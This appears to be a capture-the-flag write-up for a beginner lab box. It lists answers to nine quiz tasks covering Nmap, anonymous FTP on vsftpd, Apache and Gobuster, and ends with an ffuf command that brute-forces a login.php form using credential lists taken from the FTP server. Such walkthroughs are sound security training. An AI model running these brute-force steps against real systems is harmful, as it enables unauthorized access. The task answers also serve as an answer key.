#Task 1: What Nmap scanning switch employs the use of default scripts during a scan?
-sC

# Task 2: What service version is found to be running on port 21?
vsftpd 3.0.3

# Task 3: What FTP code is returned to us for the "Anonymous FTP login allowed" message?
230

# Task 4: After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?
anonymous

# Task 5: After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?
get

# Task 6: What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?
admin

# Task 7: What version of Apache HTTP Server is running on the target host?
Apache httpd 2.4.41

# Task 8: What switch can we use with Gobuster to specify we are looking for specific filetypes?
-x

# Task 9: Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?
login.php

# Flag: 
`ftp 10.129.1.15` connect to FTP to get username and password list, access to `login.php` page and bruce force `ffuf -w allowed.userlist:FUZZ1 -w allowed.userlist.passwd:FUZZ2  -u http://10.129.1.15/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "Username=FUZZ1&Password=FUZZ2&Submit=Login" -fs 1978`
